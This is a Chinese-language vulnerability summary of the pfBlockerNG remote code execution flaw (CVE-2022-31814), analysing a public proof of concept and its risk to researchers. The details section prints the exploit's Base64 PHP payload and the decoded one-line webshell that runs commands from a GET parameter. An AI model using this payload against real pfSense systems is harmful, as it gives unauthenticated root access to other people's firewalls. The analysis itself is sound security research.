## CVE-2022-31814 - pfSense pfBlockerNG 插件 远程代码执行 (RCE)

**漏洞编号:** CVE-2022-31814

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** pfSense pfBlockerNG 插件

**危害等级:** 严重 (CRITICAL)

**CVSS评分:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**影响版本:** pfBlockerNG <= 2.1.4_26

**利用条件:** 无需身份验证，目标系统需安装并启用 pfBlockerNG 插件，且 Web 服务可被外部访问。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2022-31814 是 pfSense 系统中热门插件 pfBlockerNG 的一个高危漏洞。该漏洞源于对 HTTP Host 请求头的过滤不严，攻击者可以通过构造特殊的 Host 头信息，将恶意 PHP 代码注入到系统的包含文件中，从而在无需任何身份凭证的情况下实现远程代码执行。分析提供的 POC 代码（Python3 编写）可见其有效性极高。该 POC 首先通过访问 /pfblockerng/www/index.php 验证目标是否存在漏洞插件。核心利用步骤是通过修改 HTTP Header 中的 Host 字段。在 POC 中，Payload 使用了 Base64 编码的 PHP 代码：'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'。这段代码解码后会创建一个名为 system_advanced_control.php 的 WebShell，内容为简单的命令执行后门：<?php print(passthru($_GET['c']));?>。POC 随后会通过 GET 请求执行 'id' 命令来验证 WebShell 是否上传成功。如果返回结果包含 'uid=0(root)'，则证明已获取系统最高权限。整个利用流程逻辑清晰，利用了 PHP 系统调用的不安全处理，属于典型的 Header 注入导致的命令执行，在互联网暴露面较广的情况下威胁极大。\n\n关于投毒风险分析：该 POC 的投毒风险被评定为低（15%）。代码主要使用 Python 的标准库 requests、argparse 和 urllib，结构透明，易于审计。其核心逻辑集中在模拟攻击者的利用路径，即构造恶意 Header 并验证响应结果。尽管代码中包含 Base64 编码的 Payload，但这是为了绕过 WAF 或避免特殊字符破坏请求结构，且解码后的内容明确指向创建一个用于命令执行测试的本地文件（/usr/local/www/system_advanced_control.php），属于标准的安全研究验证行为。代码中未发现隐藏的反向连接、未知的远程脚本下载（curl/wget 到第三方恶意 IP）、或对执行机器敏感文件（如 /etc/shadow 或 ssh 密钥）的窃取行为。唯一需要关注的是，使用者在运行此类脚本时，其自身的 IP 地址会被目标系统日志记录，且生成的 WebShell 若不及时清理，可能被第三方利用。由于代码逻辑纯粹用于漏洞复现，不存在明显的恶意混淆或针对研究员主机的破坏性指令，因此投毒风险较低，但仍建议在受控的沙箱环境中进行测试。

**项目地址:** [https://github.com/IHTeam/Pfsense-pfBlockerNG-RCE](https://www.google.com/search?q=https://github.com/IHTeam/Pfsense-pfBlockerNG-RCE)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2022-31814](https://nvd.nist.gov/vuln/detail/CVE-2022-31814)
